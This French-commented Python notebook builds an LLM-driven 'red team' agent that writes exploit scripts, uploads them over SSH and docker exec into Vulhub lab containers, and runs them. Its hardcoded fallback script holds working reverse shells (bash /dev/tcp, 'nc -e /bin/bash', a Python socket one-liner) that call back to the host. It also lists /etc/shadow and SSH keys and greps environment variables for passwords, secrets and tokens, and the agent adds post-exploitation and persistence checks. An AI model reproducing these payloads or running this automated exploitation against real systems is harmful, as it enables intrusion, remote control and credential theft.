# Enhanced Red Team Agent avec Exécution Distante
# Filename: notebook_07_enhanced_redteam_remote.ipynb

# %% [markdown]
"""
# Agent Red Team Enhanced - Exécution Distante Réelle

## Révolution de l'Exploitation :
- ✅ **Exécution SSH distante** : Scripts d'exploit lancés directement sur les containers
- ✅ **Reverse Shell réel** : Connexions authentiques via netcat sur machine hôte
- ✅ **Adaptation contextuelle** : Exploits générés selon l'environnement réel détecté
- ✅ **Validation en temps réel** : Tests immédiats des payloads sur la cible
- ✅ **Persistence testing** : Établissement de backdoors et maintien d'accès
- ✅ **Evidence collection** : Preuves de compromission réelles

## Architecture Révolutionnaire :
Container LLM → SSH (100.91.1.1) → docker exec → Container Vulhub → Exploitation RÉELLE

## Workflow Enhanced :
1. **Analyse du rapport Enhanced** : Données de reconnaissance réelle
2. **Génération d'exploits adaptés** : Scripts personnalisés pour l'environnement
3. **Upload SSH** : Transfert des exploits vers le container cible
4. **Exécution distante** : Lancement réel des exploits
5. **Listener management** : Reverse shells authentiques
6. **Validation et preuves** : Collection d'artefacts de compromission
"""

# %%
import os
import json
import subprocess
import sys
import time
import base64
from typing import Dict, List, Any, Optional
from datetime import datetime
from pathlib import Path

# Import du Remote Execution Manager
try:
    from remote_execution_manager import (
        SSHDockerManager, RemoteExploitExecutor,
        SSHConfig, get_ssh_config_interactive,
        select_target_container_interactive
    )
except ImportError:
    print("⚠ Remote Execution Manager non trouvé. Assurez-vous qu'il est disponible.")
    sys.exit(1)

# Imports LangChain et Pydantic
from pydantic import BaseModel, Field, validator
from langchain.llms import Ollama
from langchain.embeddings import OllamaEmbeddings
from langchain.vectorstores import Chroma
from langchain.prompts import PromptTemplate
from langchain.chains import LLMChain
from langchain.output_parsers import PydanticOutputParser

print("🔴 Enhanced Red Team Agent - Remote Execution Ready")

# %%
# Modèles Pydantic Enhanced pour l'exploitation distante
class RemoteExploitExecution(BaseModel):
    """Résultats d'exécution d'exploit sur container distant"""
    
    script_uploaded: bool = Field(
        description="Script d'exploit uploadé avec succès"
    )
    
    script_path: str = Field(
        description="Chemin du script sur le container cible"
    )
    
    execution_successful: bool = Field(
        description="Exécution du script réussie"
    )
    
    execution_output: str = Field(
        description="Sortie de l'exécution du script",
        default=""
    )
    
    execution_errors: str = Field(
        description="Erreurs d'exécution",
        default=""
    )
    
    reverse_shell_established: bool = Field(
        description="Reverse shell établi avec succès",
        default=False
    )
    
    reverse_shell_details: Dict[str, Any] = Field(
        description="Détails de la connexion reverse shell",
        default_factory=dict
    )
    
    compromise_evidence: List[str] = Field(
        description="Preuves de compromission collectées",
        default_factory=list
    )

class EnhancedExploitScript(BaseModel):
    """Script d'exploitation enhanced adapté à l'environnement réel"""
    
    script_name: str = Field(
        description="Nom du fichier de script"
    )
    
    script_language: str = Field(
        description="Langage du script (python, bash, etc.)"
    )
    
    script_content: str = Field(
        description="Code source complet adapté à l'environnement"
    )
    
    target_payload: str = Field(
        description="Payload principal personnalisé"
    )
    
    environment_adaptations: List[str] = Field(
        description="Adaptations spécifiques à l'environnement détecté",
        default_factory=list
    )
    
    reverse_shell_config: Dict[str, Any] = Field(
        description="Configuration reverse shell pour cet environnement",
        default_factory=dict
    )
    
    dependencies: List[str] = Field(
        description="Dépendances requises",
        default_factory=list
    )
    
    persistence_mechanisms: List[str] = Field(
        description="Mécanismes de persistance inclus",
        default_factory=list
    )
    
    @validator('script_content')
    def validate_script_content(cls, v):
        if len(v.strip()) < 100:
            raise ValueError("Le script enhanced doit être substantiel")
        return v

class EnhancedExploitationReport(BaseModel):
    """Rapport d'exploitation enhanced avec validation réelle"""
    
    exploitation_strategy: str = Field(
        description="Stratégie d'exploitation adaptée à l'environnement réel"
    )
    
    environment_analysis: Dict[str, Any] = Field(
        description="Analyse de l'environnement cible réel",
        default_factory=dict
    )
    
    generated_exploit: EnhancedExploitScript = Field(
        description="Script d'exploitation enhanced généré"
    )
    
    remote_execution: RemoteExploitExecution = Field(
        description="Résultats de l'exécution distante"
    )
    
    real_world_impact: Dict[str, Any] = Field(
        description="Impact réel de l'exploitation",
        default_factory=dict
    )
    
    post_exploitation_actions: List[str] = Field(
        description="Actions post-exploitation réalisées",
        default_factory=list
    )
    
    success_level: str = Field(
        description="Niveau de succès (FULL_REMOTE, PARTIAL_REMOTE, FAILED_REMOTE)"
    )
    
    @validator('success_level')
    def validate_success_level(cls, v):
        allowed = ["FULL_REMOTE", "PARTIAL_REMOTE", "FAILED_REMOTE"]
        if v not in allowed:
            raise ValueError(f"success_level doit être dans {allowed}")
        return v

print("✅ Enhanced Pydantic Models defined")

# %%
# Enhanced Red Team Agent avec capacités d'exécution distante
class EnhancedRedTeamAgent:
    """
    Agent Red Team enhanced avec capacités d'exploitation distante réelle
    Génère ET exécute des exploits directement sur les containers cibles
    """
    
    def __init__(self, model_name: str = "llama2:7b", enhanced_db_path: str = "./enhanced_vple_chroma_db"):
        print("🔴 Initialisation Enhanced Red Team Agent...")
        
        # Composants LLM
        self.llm = Ollama(model=model_name, temperature=0.3)
        self.embeddings = OllamaEmbeddings(model=model_name)
        
        # Base de données Enhanced (ATOMIC RED TEAM)
        try:
            self.vectorstore = Chroma(
                persist_directory=enhanced_db_path,
                embedding_function=self.embeddings
            )
            self.retriever = self.vectorstore.as_retriever(search_kwargs={"k": 5})
            print(f"  ✅ Base ATOMIC connectée: {enhanced_db_path}")
        except Exception as e:
            print(f"  ⚠ Erreur base ATOMIC: {e}")
            self.vectorstore = None
            self.retriever = None
        
        # Composants d'exécution distante
        self.ssh_manager = None
        self.exploit_executor = None
        self.target_container = None
        self.host_ip = None
        
        # Parsers Pydantic enhanced
        self.script_parser = PydanticOutputParser(pydantic_object=EnhancedExploitScript)
        self.report_parser = PydanticOutputParser(pydantic_object=EnhancedExploitationReport)
        
        # Configuration des prompts enhanced
        self._setup_enhanced_prompts()
        
        print("  ✅ Enhanced Red Team Agent initialisé")
    
    def setup_remote_connection(self, ssh_config: SSHConfig = None) -> bool:
        """Configure la connexion distante pour l'exploitation"""
        print("\n🔗 Configuration connexion distante Red Team...")
        
        # Configuration SSH
        if ssh_config is None:
            ssh_config = get_ssh_config_interactive()
        
        # Initialisation gestionnaire SSH
        self.ssh_manager = SSHDockerManager(ssh_config)
        
        if not self.ssh_manager.connect():
            print("❌ Échec connexion SSH")
            return False
        
        # Initialisation exécuteur d'exploits
        self.exploit_executor = RemoteExploitExecutor(self.ssh_manager)
        
        # Récupération de l'IP hôte pour reverse shells
        self.host_ip = ssh_config.host
        
        print("✅ Connexion distante Red Team établie")
        return True
    
    def load_target_from_analysis(self, analysis_report_path: str) -> Dict[str, Any]:
        """Charge les informations de la cible depuis le rapport Enhanced Analyzer"""
        print("📖 Chargement du rapport d'analyse enhanced...")
        
        try:
            with open(analysis_report_path, 'r') as f:
                analysis_data = json.load(f)
            
            # Extraction des informations cible
            metadata = analysis_data.get('metadata', {})
            enhanced_info = analysis_data.get('enhanced_vulhub_info', {})
            
            target_info = {
                "container_id": metadata.get('target_container'),
                "vulhub_id": metadata.get('vulhub_id'),
                "ports_real": enhanced_info.get('real_vs_documented_ports', {}).get('real', []),
                "attack_type": enhanced_info.get('attack_type', 'Unknown'),
                "service": enhanced_info.get('target_service', 'Unknown'),
                "cve": enhanced_info.get('cve_id'),
                "remote_recon": enhanced_info.get('remote_recon', {}),
                "confidence_score": analysis_data.get('enhanced_analysis_report', {}).get('confidence_score', 0.5)
            }
            
            # Configuration du container cible
            if target_info["container_id"]:
                self.target_container = target_info["container_id"]
                self.exploit_executor.set_target_container(self.target_container)
                print(f"  ✅ Container cible: {self.target_container[:12]}")
            else:
                print("  ⚠ Container cible non défini dans le rapport")
            
            print(f"  📊 Type d'attaque: {target_info['attack_type']}")
            print(f"  🎯 Service: {target_info['service']}")
            print(f"  🔌 Ports réels: {target_info['ports_real']}")
            
            return target_info
            
        except Exception as e:
            print(f"❌ Erreur chargement rapport: {e}")
            return {}
    
    def _setup_enhanced_prompts(self):
        """Configuration des prompts enhanced pour exploitation distante"""
        
        # Prompt de stratégie enhanced
        strategy_template = """Tu es un expert Red Team avec accès aux données de reconnaissance RÉELLE.

RAPPORT D'ANALYSE ENHANCED (DONNÉES RÉELLES):
{analysis_report}

TECHNIQUES ATOMIC RED TEAM:
{atomic_techniques}

ENVIRONNEMENT CIBLE RÉEL:
- Container ID: {target_container}
- Ports ouverts confirmés: {real_ports}
- Services web détectés: {web_services}
- Système d'exploitation: {target_os}

MISSION: Développer une stratégie d'exploitation pour un VRAI container Docker.

CONTRAINTES RÉELLES:
1. Le script sera exécuté VIA SSH sur le container réel
2. L'environnement est un container Docker (limites et spécificités)
3. Les reverse shells doivent pointer vers {host_ip}
4. Utiliser les ports réellement ouverts: {real_ports}

RAISONNEMENT STRATÉGIQUE:
Analyse l'environnement réel détecté et adapte ta stratégie aux spécificités du container.
Considère les outils disponibles, les permissions, et les limitations d'un environnement containerisé.

STRATÉGIE D'EXPLOITATION ADAPTÉE (300-400 mots):"""

        self.strategy_prompt = PromptTemplate(
            template=strategy_template,
            input_variables=["analysis_report", "atomic_techniques", "target_container", "real_ports", "web_services", "target_os", "host_ip"]
        )
        
        # Prompt de génération d'exploit enhanced
        script_template = """Tu es un développeur d'exploits expert spécialisé dans les containers Docker.

STRATÉGIE D'EXPLOITATION:
{exploitation_strategy}

ENVIRONNEMENT CIBLE RÉEL:
{target_environment}

CONFIGURATION REVERSE SHELL:
- IP Machine Hôte: {host_ip}
- Port Listener: {listener_port}
- Environnement: Container Docker

{format_instructions}

CONTRAINTES SPÉCIFIQUES AUX CONTAINERS:
1. Le script s'exécute DANS le container via SSH + docker exec
2. Environnement isolé avec limitations possibles
3. Outils disponibles limités (vérifier avant utilisation)
4. Reverse shell vers la machine HÔTE (pas localhost)
5. Gestion des permissions container

ADAPTATIONS REQUISES:
1. Vérifier disponibilité des outils (curl, wget, nc, etc.)
2. Adapter les payloads à l'environnement container
3. Prévoir des alternatives si certains outils manquent
4. Optimiser pour l'exécution distante

GÉNÉRER UN SCRIPT COMPLET ET FONCTIONNEL:"""

        self.script_prompt = PromptTemplate(
            template=script_template,
            input_variables=["exploitation_strategy", "target_environment", "host_ip", "listener_port"],
            partial_variables={"format_instructions": self.script_parser.get_format_instructions()}
        )
        
        # Chaînes LangChain
        self.strategy_chain = LLMChain(llm=self.llm, prompt=self.strategy_prompt)
        self.script_chain = LLMChain(llm=self.llm, prompt=self.script_prompt)
    
    def analyze_target_environment(self, target_info: Dict[str, Any]) -> str:
        """Analyse l'environnement cible et consulte ATOMIC RED TEAM"""
        print("🧠 Analyse de l'environnement cible et consultation ATOMIC...")
        
        # Extraction des données clés
        attack_type = target_info.get('attack_type', 'Unknown')
        real_ports = target_info.get('ports_real', [])
        
        # Consultation ATOMIC RED TEAM
        atomic_techniques = ""
        if self.retriever:
            try:
                search_query = f"{attack_type} container docker exploitation atomic red team"
                docs = self.retriever.get_relevant_documents(search_query)
                
                if docs:
                    atomic_techniques = "\n".join([doc.page_content[:400] for doc in docs[:3]])
                    print(f"  ⚡ {len(docs)} techniques ATOMIC trouvées")
                else:
                    atomic_techniques = "Aucune technique ATOMIC spécifique trouvée"
            except Exception as e:
                print(f"  ⚠ Erreur consultation ATOMIC: {e}")
                atomic_techniques = "Erreur accès base ATOMIC"
        
        # Préparation des données d'environnement
        web_services = []
        target_os = "Linux (Container)"
        
        remote_recon = target_info.get('remote_recon', {})
        if remote_recon.get('web_services'):
            web_discoveries = remote_recon['web_services'].get('web_discoveries', {})
            web_services = [f"Port {port}" for port, data in web_discoveries.items() 
                          if data.get('accessible')]
        
        # Génération de la stratégie
        try:
            strategy = self.strategy_chain.run(
                analysis_report=json.dumps(target_info, indent=2),
                atomic_techniques=atomic_techniques,
                target_container=self.target_container[:12] if self.target_container else "Unknown",
                real_ports=str(real_ports),
                web_services=str(web_services),
                target_os=target_os,
                host_ip=self.host_ip
            )
            
            print("  ✅ Stratégie d'exploitation enhanced générée")
            return strategy
            
        except Exception as e:
            print(f"  ❌ Erreur génération stratégie: {e}")
            return f"Exploitation {attack_type} adaptée aux containers Docker avec reverse shell vers {self.host_ip}"
    
    def generate_enhanced_exploit(self, strategy: str, target_info: Dict[str, Any]) -> EnhancedExploitScript:
        """Génère un exploit enhanced adapté à l'environnement réel"""
        print("⚒️ Génération d'exploit enhanced pour container...")
        
        # Configuration du reverse shell
        listener_result = self.exploit_executor.setup_reverse_shell_listener()
        
        if listener_result.get('success'):
            listener_port = listener_result['port']
            print(f"  🎧 Listener configuré sur port {listener_port}")
        else:
            listener_port = 4444
            print(f"  ⚠ Listener par défaut port {listener_port}")
        
        max_attempts = 3
        for attempt in range(max_attempts):
            try:
                # Préparation de l'environnement pour le LLM
                target_environment = {
                    "container_id": self.target_container,
                    "real_ports": target_info.get('ports_real', []),
                    "attack_type": target_info.get('attack_type'),
                    "service": target_info.get('service'),
                    "os": "Linux Container"
                }
                
                # Génération avec le LLM
                raw_script = self.script_chain.run(
                    exploitation_strategy=strategy,
                    target_environment=json.dumps(target_environment, indent=2),
                    host_ip=self.host_ip,
                    listener_port=listener_port
                )
                
                # Parsing avec Pydantic
                enhanced_script = self.script_parser.parse(raw_script)
                
                # Enrichissement des configurations
                enhanced_script.reverse_shell_config = {
                    "host_ip": self.host_ip,
                    "port": listener_port,
                    "listener_pid": listener_result.get('pid'),
                    "log_file": listener_result.get('log_file')
                }
                
                print(f"  ✅ Exploit enhanced généré: {enhanced_script.script_name}")
                print(f"  🔧 Langage: {enhanced_script.script_language}")
                print(f"  🌐 Reverse shell: {self.host_ip}:{listener_port}")
                
                return enhanced_script
                
            except Exception as e:
                print(f"  ⚠ Tentative {attempt + 1} échouée: {e}")
                if attempt == max_attempts - 1:
                    return self._create_enhanced_fallback_script(target_info, listener_port)
                time.sleep(1)
    
    def _create_enhanced_fallback_script(self, target_info: Dict, listener_port: int) -> EnhancedExploitScript:
        """Crée un script enhanced de fallback"""
        print("  🔄 Création d'un exploit de fallback enhanced...")
        
        attack_type = target_info.get('attack_type', 'Web Exploitation')
        real_ports = target_info.get('ports_real', [80, 8080])
        
        # Script adapté aux containers
        fallback_script = f"""#!/bin/bash
# Enhanced Exploit Script pour Container Docker
# Target: {target_info.get('service', 'Unknown Service')}
# Attack: {attack_type}

echo "[+] Enhanced Red Team Exploit - Container Environment"
echo "[+] Target Container: $HOSTNAME"
echo "[+] Attack Type: {attack_type}"
echo "[+] Real Ports Detected: {real_ports}"

# Reconnaissance container
echo "[+] === RECONNAISSANCE CONTAINER ==="
echo "[+] User: $(whoami)"
echo "[+] ID: $(id)"
echo "[+] PWD: $(pwd)"
echo "[+] OS Info: $(uname -a)"

# Vérification outils disponibles
echo "[+] === OUTILS DISPONIBLES ==="
for tool in curl wget nc nmap netstat ss; do
    if command -v $tool >/dev/null 2>&1; then
        echo "[+] $tool: DISPONIBLE"
    else
        echo "[-] $tool: NON DISPONIBLE"
    fi
done

# Test connectivité réseau
echo "[+] === TEST CONNECTIVITÉ ==="
echo "[+] Test vers machine hôte {self.host_ip}..."
if ping -c 1 {self.host_ip} >/dev/null 2>&1; then
    echo "[+] Machine hôte accessible"
else
    echo "[-] Machine hôte non accessible"
fi

# Tentative reverse shell
echo "[+] === REVERSE SHELL ATTEMPT ==="
echo "[+] Tentative reverse shell vers {self.host_ip}:{listener_port}"

# Multiple reverse shell techniques
echo "[+] Technique 1: Bash TCP"
bash -c 'bash -i >& /dev/tcp/{self.host_ip}/{listener_port} 0>&1' &

echo "[+] Technique 2: NC (si disponible)"
if command -v nc >/dev/null 2>&1; then
    nc {self.host_ip} {listener_port} -e /bin/bash &
fi

echo "[+] Technique 3: Python (si disponible)"
if command -v python3 >/dev/null 2>&1; then
    python3 -c "
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('{self.host_ip}',{listener_port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/bash','-i'])
" &
fi

# Collection d'informations sensibles
echo "[+] === INFORMATION GATHERING ==="
echo "[+] Fichiers sensibles:"
ls -la /etc/passwd /etc/shadow /root/.ssh/ 2>/dev/null || echo "[-] Accès limité"

echo "[+] Variables d'environnement:"
env | grep -E "(PASSWORD|SECRET|KEY|TOKEN)" || echo "[-] Pas de secrets évidents"

echo "[+] Processus actifs:"
ps aux | head -10

echo "[+] Connexions réseau:"
netstat -tuln 2>/dev/null || ss -tuln 2>/dev/null || echo "[-] Outils réseau limités"

echo "[+] === EXPLOITATION TERMINÉE ==="
echo "[+] Vérifiez le listener sur {self.host_ip}:{listener_port}"
"""
        
        return EnhancedExploitScript(
            script_name="enhanced_container_exploit.sh",
            script_language="bash",
            script_content=fallback_script,
            target_payload=f"bash -i >& /dev/tcp/{self.host_ip}/{listener_port} 0>&1",
            environment_adaptations=[
                "Adapté aux containers Docker",
                "Vérification outils disponibles",
                "Multiple techniques reverse shell",
                "Reconnaissance container intégrée"
            ],
            reverse_shell_config={
                "host_ip": self.host_ip,
                "port": listener_port,
                "techniques": ["bash_tcp", "netcat", "python"]
            },
            dependencies=["bash"],
            persistence_mechanisms=["background_processes"]
        )
    
    def execute_enhanced_exploit(self, enhanced_script: EnhancedExploitScript) -> RemoteExploitExecution:
        """Exécute l'exploit enhanced sur le container distant"""
        print("🚀 Exécution de l'exploit enhanced sur container distant...")
        
        if not self.exploit_executor or not self.target_container:
            return RemoteExploitExecution(
                script_uploaded=False,
                script_path="",
                execution_successful=False,
                execution_output="Container cible non configuré"
            )
        
        # Upload et exécution du script
        execution_result = self.exploit_executor.upload_and_execute_script(
            enhanced_script.script_content,
            enhanced_script.script_name,
            enhanced_script.script_language
        )
        
        # Vérification du reverse shell
        reverse_shell_success = False
        reverse_shell_details = {}
        
        if enhanced_script.reverse_shell_config:
            listen_port = enhanced_script.reverse_shell_config.get('port')
            if listen_port:
                print(f"  🎧 Vérification reverse shell port {listen_port}...")
                time.sleep(5)  # Laisser le temps à la connexion
                
                shell_check = self.exploit_executor.check_reverse_shell_connection(listen_port)
                reverse_shell_success = shell_check.get('has_connection', False)
                reverse_shell_details = shell_check
                
                if reverse_shell_success:
                    print("  ✅ Reverse shell établi avec succès!")
                else:
                    print("  ⚠ Reverse shell non détecté")
        
        # Collection de preuves de compromission
        evidence = []
        if execution_result.get('success'):
            evidence.append("Script d'exploitation exécuté avec succès")
            
            output = execution_result.get('execution_output', '')
            if 'root' in output or 'uid=0' in output:
                evidence.append("Privilèges root détectés")
            if 'bash' in output and 'tcp' in output:
                evidence.append("Tentative de reverse shell détectée")
            if '/etc/passwd' in output:
                evidence.append("Accès aux fichiers système sensibles")
        
        if reverse_shell_success:
            evidence.append("Reverse shell établi vers machine hôte")
        
        return RemoteExploitExecution(
            script_uploaded=execution_result.get('success', False),
            script_path=execution_result.get('script_path', ''),
            execution_successful=execution_result.get('success', False),
            execution_output=execution_result.get('execution_output', ''),
            execution_errors=execution_result.get('execution_errors', ''),
            reverse_shell_established=reverse_shell_success,
            reverse_shell_details=reverse_shell_details,
            compromise_evidence=evidence
        )
    
    def perform_post_exploitation(self) -> List[str]:
        """Effectue des actions post-exploitation sur le container"""
        print("🔍 Actions post-exploitation...")
        
        if not self.exploit_executor or not self.target_container:
            return ["Container non accessible pour post-exploitation"]
        
        post_actions = []
        
        # Collection d'informations supplémentaires
        info_commands = [
            ("System Info", "uname -a && cat /etc/os-release"),
            ("User Info", "whoami && id && groups"),
            ("Network Config", "ip addr show 2>/dev/null || ifconfig"),
            ("Process List", "ps aux | head -20"),
            ("Mount Points", "mount | grep -E '(ext|xfs|btrfs)'"),
            ("Environment", "env | grep -E '(PATH|HOME|USER)'")
        ]
        
        for action_name, command in info_commands:
            result = self.exploit_executor.execute_direct_command(
                command, f"Post-exploitation: {action_name}"
            )
            
            if result.get('success'):
                post_actions.append(f"{action_name}: Collecté")
            else:
                post_actions.append(f"{action_name}: Échec")
        
        # Tentative de persistance (si approprié)
        persistence_commands = [
            ("Crontab Check", "crontab -l 2>/dev/null || echo 'No crontab'"),
            ("SSH Keys", "ls -la ~/.ssh/ 2>/dev/null || echo 'No SSH dir'"),
            ("Writable Dirs", "find /tmp /var/tmp -writable -type d 2>/dev/null | head -5")
        ]
        
        for action_name, command in persistence_commands:
            result = self.exploit_executor.execute_direct_command(command, action_name)
            if result.get('success'):
                post_actions.append(f"Persistance {action_name}: Analysé")
        
        print(f"  ✅ {len(post_actions)} actions post-exploitation effectuées")
        return post_actions
    
    def generate_enhanced_report(self, strategy: str, enhanced_script: EnhancedExploitScript, 
                                execution_result: RemoteExploitExecution, target_info: Dict[str, Any]) -> EnhancedExploitationReport:
        """Génère le rapport d'exploitation enhanced"""
        print("📋 Génération du rapport enhanced...")
        
        # Actions post-exploitation
        post_actions = self.perform_post_exploitation()
        
        # Détermination du niveau de succès
        if execution_result.reverse_shell_established:
            success_level = "FULL_REMOTE"
        elif execution_result.execution_successful:
            success_level = "PARTIAL_REMOTE"
        else:
            success_level = "FAILED_REMOTE"
        
        # Analyse de l'impact réel
        real_impact = {
            "container_compromised": execution_result.execution_successful,
            "reverse_shell_obtained": execution_result.reverse_shell_established,
            "evidence_collected": len(execution_result.compromise_evidence),
            "post_exploitation_actions": len(post_actions),
            "real_world_validation": True
        }
        
        # Analyse de l'environnement
        env_analysis = {
            "target_container": self.target_container[:12] if self.target_container else "Unknown",
            "real_ports_exploited": target_info.get('ports_real', []),
            "attack_type_confirmed": target_info.get('attack_type'),
            "service_compromised": target_info.get('service'),
            "host_ip_targeted": self.host_ip
        }
        
        return EnhancedExploitationReport(
            exploitation_strategy=strategy[:500],
            environment_analysis=env_analysis,
            generated_exploit=enhanced_script,
            remote_execution=execution_result,
            real_world_impact=real_impact,
            post_exploitation_actions=post_actions,
            success_level=success_level
        )
    
    def run_enhanced_exploitation(self, analysis_report_path: str) -> Dict[str, Any]:
        """Méthode principale d'exploitation enhanced avec exécution distante"""
        print(f"\n{'🔴'*25}")
        print(f"🔴 EXPLOITATION ENHANCED AVEC EXÉCUTION DISTANTE")
        print(f"{'🔴'*25}")
        
        start_time = time.time()
        
        try:
            # Étape 1: Configuration connexion distante
            print("\n🔗 [1/6] Configuration connexion distante...")
            if not self.setup_remote_connection():
                return {"status": "ERROR", "error": "Connexion distante impossible"}
            
            # Étape 2: Chargement du rapport d'analyse
            print("\n📖 [2/6] Chargement rapport d'analyse enhanced...")
            target_info = self.load_target_from_analysis(analysis_report_path)
            
            if not target_info or not self.target_container:
                return {"status": "ERROR", "error": "Informations cible invalides"}
            
            # Étape 3: Analyse de l'environnement et stratégie
            print("\n🧠 [3/6] Analyse environnement et stratégie...")
            strategy = self.analyze_target_environment(target_info)
            
            # Étape 4: Génération d'exploit enhanced
            print("\n⚒️ [4/6] Génération exploit enhanced...")
            enhanced_script = self.generate_enhanced_exploit(strategy, target_info)
            
            # Étape 5: Exécution distante de l'exploit
            print("\n🚀 [5/6] Exécution distante de l'exploit...")
            execution_result = self.execute_enhanced_exploit(enhanced_script)
            
            # Étape 6: Génération du rapport final
            print("\n📋 [6/6] Génération rapport final...")
            enhanced_report = self.generate_enhanced_report(
                strategy, enhanced_script, execution_result, target_info
            )
            
            # Nettoyage
            if self.exploit_executor:
                self.exploit_executor.cleanup_exploits()
            
            # Compilation du résultat
            total_time = time.time() - start_time
            
            complete_result = {
                "metadata": {
                    "agent": "EnhancedRedTeamAgent",
                    "version": "Remote_2.0",
                    "timestamp": datetime.now().isoformat(),
                    "execution_time": total_time,
                    "target_container": self.target_container,
                    "host_ip": self.host_ip
                },
                "enhanced_exploitation_report": enhanced_report.dict(),
                "remote_validation": True,
                "status": "SUCCESS"
            }
            
            # Sauvegarde du rapport
            report_file = "enhanced_exploitation_report.json"
            with open(report_file, 'w') as f:
                json.dump(complete_result, f, indent=2)
            
            print(f"\n✅ EXPLOITATION ENHANCED TERMINÉE")
            print(f"⏱️ Temps total: {total_time:.2f} secondes")
            print(f"🎯 Niveau de succès: {enhanced_report.success_level}")
            print(f"🔗 Reverse shell: {execution_result.reverse_shell_established}")
            print(f"📋 Preuves: {len(execution_result.compromise_evidence)}")
            print(f"💾 Rapport sauvegardé: {report_file}")
            
            return complete_result
            
        except Exception as e:
            print(f"\n❌ ERREUR EXPLOITATION ENHANCED: {e}")
            return {
                "metadata": {
                    "agent": "EnhancedRedTeamAgent",
                    "timestamp": datetime.now().isoformat()
                },
                "status": "ERROR",
                "error": str(e)
            }
        
        finally:
            # Nettoyage des connexions
            if self.ssh_manager:
                self.ssh_manager.disconnect()

print("✅ EnhancedRedTeamAgent class defined")

# %%
# Interface de démonstration
def demo_enhanced_redteam():
    """Démonstration de l'Enhanced Red Team avec exécution distante"""
    print("\n🧪 DÉMONSTRATION - ENHANCED RED TEAM REMOTE")
    print("="*60)
    
    # Chargement configuration
    try:
        with open("vple_config.json", "r") as f:
            config = json.load(f)
        model_name = config.get("confirmed_model", "llama2:7b")
        enhanced_db_path = config.get("enhanced_rag_setup", {}).get("vector_db", "./enhanced_vple_chroma_db")
    except:
        model_name = "llama2:7b"
        enhanced_db_path = "./enhanced_vple_chroma_db"
    
    # Initialisation de l'agent enhanced
    red_team = EnhancedRedTeamAgent(
        model_name=model_name,
        enhanced_db_path=enhanced_db_path
    )
    
    # Recherche du rapport d'analyse
    analysis_files = [
        "enhanced_analysis_apache_CVE-2021-41773.json",
        "enhanced_analysis_struts2_s2-001.json",
        "analysis_report.json"
    ]
    
    analysis_file = None
    for file_path in analysis_files:
        if os.path.exists(file_path):
            analysis_file = file_path
            break
    
    if not analysis_file:
        print("❌ Aucun rapport d'analyse trouvé")
        print("   Fichiers recherchés:", analysis_files)
        return
    
    print(f"📖 Utilisation du rapport: {analysis_file}")
    
    # Exécution de l'exploitation enhanced
    result = red_team.run_enhanced_exploitation(analysis_file)
    
    # Affichage des résultats
    if result['status'] == 'SUCCESS':
        exploitation_report = result['enhanced_exploitation_report']
        print(f"\n🎉 EXPLOITATION ENHANCED RÉUSSIE!")
        print(f"   🎯 Succès: {exploitation_report['success_level']}")
        print(f"   🔗 Reverse shell: {exploitation_report['remote_execution']['reverse_shell_established']}")
        print(f"   📋 Preuves: {len(exploitation_report['remote_execution']['compromise_evidence'])}")
        print(f"   ⚙️ Post-exploitation: {len(exploitation_report['post_exploitation_actions'])}")
        
        if exploitation_report['remote_execution']['compromise_evidence']:
            print(f"\n🚨 PREUVES DE COMPROMISSION:")
            for evidence in exploitation_report['remote_execution']['compromise_evidence']:
                print(f"   - {evidence}")
        
    else:
        print(f"\n❌ Exploitation échouée: {result.get('error', 'Erreur inconnue')}")
    
    print(f"\n🎉 DÉMONSTRATION TERMINÉE")

if __name__ == "__main__":
    demo_enhanced_redteam()

print("\n🔴 ENHANCED RED TEAM AGENT READY!")
print("Capacités: SSH + Docker + Exploitation réelle + Reverse shells + Post-exploitation")
